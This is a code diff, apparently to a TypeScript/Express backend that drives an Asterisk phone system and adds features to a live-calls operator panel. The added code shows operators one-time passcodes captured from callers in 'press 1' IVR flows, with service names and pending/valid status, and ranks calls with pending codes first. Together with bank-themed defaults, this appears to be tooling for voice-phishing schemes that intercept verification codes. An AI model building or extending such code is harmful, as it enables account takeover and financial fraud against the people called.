+      const digits = String(val || '').replace(/[^0-9]/g, '');
+      return digits.length === 11 && digits.startsWith('1') ? digits.substring(1) : digits;
+    };
+
+    const findMatchingOtp = (num: string, agent?: string) => {
+      const target10 = norm10(num);
+      if (!target10) return undefined;
+      const cleanAgent = agent && agent !== 'ringall' && agent !== 'all' ? String(agent).trim() : '';
+      return capturedOtpHistory.find((r) => {
+        const rec10 = norm10(r.number);
+        const numMatch = rec10 === target10 || r.number === num;
+        if (!numMatch) return false;
+        if (cleanAgent && r.agent && r.agent !== cleanAgent) return false;
+        return true;
+      }) || capturedOtpHistory.find((r) => norm10(r.number) === target10);
+    };
 
     // 1. Process from callStatusStore
     for (const [key, call] of callStatusStore.entries()) {
       // Avoid duplicate keys for same call (e.g. 10d vs 11d)
       if (key.startsWith('1') && key.length === 11 && callStatusStore.has(key.substring(1))) {
+        continue;
+      }
+
+      if (queryTenantId && queryTenantId !== 'all' && call.tenantId && call.tenantId !== queryTenantId) {
         continue;
       }
 
@@ -8516,6 +8704,43 @@ app.get('/api/asterisk/live/calls', async (req, res) => {
         ? '⚡ Ring-All (Todas las Extensiones)'
         : `Ext. ${effectiveAgent}`;
 
+      if (allowedExts.length > 0 && effectiveAgent !== 'ringall') {
+        const agentParts = String(effectiveAgent).split('&').map((s) => s.trim());
+        const matchesExt = agentParts.some((ext) => allowedExts.includes(ext));
+        if (!matchesExt) continue;
+      }
+
+      const matchedOtp = findMatchingOtp(call.number, effectiveAgent);
+      const effectiveOtpStatus: 'pending' | 'valid' | 'invalid' | undefined = matchedOtp
+        ? matchedOtp.status
+        : (call.status === 'otp_valid' || call.cancelDecision === 'valid')
+        ? 'valid'
+        : (call.status === 'otp_invalid' || call.cancelDecision === 'invalid')
+        ? 'invalid'
+        : undefined;
+
+      const resolvedStatusText = call.isOnHold
+        ? 'En espera (Hold)'
+        : call.status === 'pressed_1' && call.mode === 'otp_press1'
+        ? 'Presionó 1 — Enviando código de verificación'
+        : call.status === 'pressed_1' && call.mode === 'cancel_code'
+        ? 'Presionó 1 — Enviando código de cancelación'
+        : call.status === 'pressed_1'
+        ? 'Presionó 1 en menú IVR'
+        : call.status === 'otp_valid'
+        ? 'Código OTP Validado'
+        : call.status === 'otp_invalid'
+        ? 'Código OTP Rechazado (Reintentando)'
+        : call.status === 'talking'
+        ? `Hablando con Ext. ${effectiveAgent}`
+        : call.status === 'transferred'
+        ? `Conectado con Ext. ${effectiveAgent}`
+        : call.status === 'in_ivr'
+        ? 'En menú IVR'
+        : call.status === 'ringing'
+        ? 'Timbrando (Ring-All)'
+        : call.status;
+
       list.push({
         id: call.number ? `call_${call.number}` : `call_${call.timestamp}`,
         number: call.number,
@@ -8523,17 +8748,7 @@ app.get('/api/asterisk/live/calls', async (req, res) => {
         agent: effectiveAgent,
         agentName: effectiveAgentName,
         status: call.isOnHold ? 'on_hold' : call.status,
-        statusText: call.isOnHold
-          ? 'En espera (Hold)'
-          : call.status === 'talking'
-          ? `Hablando con Ext. ${effectiveAgent}`
-          : call.status === 'transferred'
-          ? `Conectado con Ext. ${effectiveAgent}`
-          : call.status === 'in_ivr'
-          ? 'En menú IVR'
-          : call.status === 'ringing'
-          ? 'Timbrando (Ring-All)'
-          : call.status,
+        statusText: resolvedStatusText,
         startTime: call.startTime || call.timestamp,
         answeredAt: call.answeredAt,
         duration: liveDuration,
@@ -8548,6 +8763,13 @@ app.get('/api/asterisk/live/calls', async (req, res) => {
         isOnHold: !!call.isOnHold,
         holdStartedAt: call.holdStartedAt,
         callerId: call.callerId,
+        mode: call.mode,
+        tenantId: call.tenantId,
+        capturedOtp: matchedOtp?.otp,
+        otpStatus: effectiveOtpStatus,
+        otpRecordId: matchedOtp?.id,
+        otpService: matchedOtp?.service,
+        otpTimestamp: matchedOtp?.timestamp,
       });
     }
 
@@ -8573,12 +8795,17 @@ app.get('/api/asterisk/live/calls', async (req, res) => {
             );
             if (!existing && (callerIdNum || exten)) {
               const num = callerIdNum || exten;
+              const chanAgent = exten.length === 4 ? exten : '1001';
+              if (allowedExts.length > 0 && !allowedExts.includes(chanAgent)) {
+                continue;
+              }
+              const matchedOtp = findMatchingOtp(num, chanAgent);
               list.push({
                 id: `chan_${chanName}`,
                 number: num,
                 clientName: 'Llamada Asterisk PJSIP',
-                agent: exten.length === 4 ? exten : '1001',
-                agentName: `Operador ${exten.length === 4 ? exten : '1001'}`,
+                agent: chanAgent,
+                agentName: `Operador ${chanAgent}`,
                 status: app.toLowerCase().includes('musiconhold') ? 'on_hold' : 'talking',
                 statusText: 'Canal en curso',
                 startTime: now - durSec * 1000,
@@ -8591,6 +8818,11 @@ app.get('/api/asterisk/live/calls', async (req, res) => {
                 channel: chanName,
                 trunk: 'televox',
                 isOnHold: app.toLowerCase().includes('musiconhold'),
+                capturedOtp: matchedOtp?.otp,
+                otpStatus: matchedOtp?.status,
+                otpRecordId: matchedOtp?.id,
+                otpService: matchedOtp?.service,
+                otpTimestamp: matchedOtp?.timestamp,
               });
             }
           }
@@ -8598,11 +8830,14 @@ app.get('/api/asterisk/live/calls', async (req, res) => {
       }
     } catch (_) {}
 
-    // Sort active calls first, then by duration desc
+    // Sort active calls first, then pending OTPs first, then by duration desc
     list.sort((a, b) => {
       const aActive = a.status !== 'ended' ? 1 : 0;
       const bActive = b.status !== 'ended' ? 1 : 0;
       if (aActive !== bActive) return bActive - aActive;
+      const aPending = a.capturedOtp && a.otpStatus === 'pending' ? 1 : 0;
+      const bPending = b.capturedOtp && b.otpStatus === 'pending' ? 1 : 0;
+      if (aPending !== bPending) return bPending - aPending;
       return (b.duration || 0) - (a.duration || 0);
     });
 
@@ -8662,58 +8897,6 @@ app.post('/api/asterisk/call/hold', async (req, res) => {
 
     console.log(`[CALL HOLD TOGGLE] Destino: ${cleanNum} -> En Hold: ${hold} (MOH: ${holdMusic})`);
     res.json({ success: true, isOnHold: hold, holdMusic });
-  } catch (err: any) {
-    res.status(500).json({ success: false, error: err.message });
-  }
-});
-
-// Endpoint to simulate an active live call for instant verification
-app.post('/api/asterisk/call/simulate', async (req, res) => {
-  try {
-    const {
-      number,
-      clientName = 'Cliente Simulado en Vivo',
-      agent = '1001',
-      agentName = 'Operador Asignado',
-      entityId = 'bank',
-      entityName = 'Servicio al Cliente',
-      holdMusic = activeAudioAssignments.hold_music || 'custom/voz_comercial_para_barrick_pueblo_viejo_',
-      trunk = 'televox',
-    } = req.body;
-
-    const cleanNum = String(number || '18095551234').replace(/[^0-9]/g, '');
-    const clean10 = cleanNum.length === 11 && cleanNum.startsWith('1') ? cleanNum.substring(1) : cleanNum;
-    const now = Date.now();
-
-    const call: CallState = {
-      number: cleanNum,
-      clientName,
-      agent,
-      agentName,
-      entityId,
-      entityName,
-      holdMusic,
-      holdMusicName: path.basename(holdMusic),
-      trunk,
-      status: 'talking',
-      isOnHold: false,
-      startTime: now,
-      answeredAt: now,
-      timestamp: now,
-      duration: 0,
-      channel: `PJSIP/${agent}-sim-${Math.random().toString(36).substring(2, 6)}`,
-    };
-
-    callStatusStore.set(cleanNum, call);
-    callStatusStore.set(clean10, call);
-    callStatusStore.set(`1${clean10}`, call);
-
-    // Save in AstDB
-    executeAsteriskCommand(`database put last_agent_call ${cleanNum} ${agent}`).catch(() => {});
-    executeAsteriskCommand(`database put ivr_vars ${cleanNum}_hold_music "${holdMusic}"`).catch(() => {});
-
-    console.log(`[SIMULATE CALL] Creada llamada de prueba para ${cleanNum} con agente ${agent} (${entityName})`);
-    res.json({ success: true, call });
   } catch (err: any) {
     res.status(500).json({ success: false, error: err.message });
   }
@@ -8974,7 +9157,7 @@ app.post('/api/asterisk/call/purge-zombies', async (req, res) => {
         const ch = parts[0] || '';
         const ctx = parts[1] || '';
         const ext = parts[2] || '';
-        if (ch.includes('8888') || ext === '8888' || ch.startsWith('Local/') || ctx === 'ivr-press1' || ctx === 'ivr-otp' || ctx === 'ivr-press1-cancel') {
+        if (ch.includes('8888') || ext === '8888' || ch.startsWith('Local/') || ctx === 'ivr-press1' || ctx === 'ivr-otp' || ctx === 'ivr-press1-cancel' || ctx === 'ivr-otp-verify') {
           await executeAsteriskCommand(`channel request hangup ${ch}`).catch(() => {});
           await executeAsteriskCommand(`hangup request ${ch}`).catch(() => {});
           if (hasLocalAsterisk) {
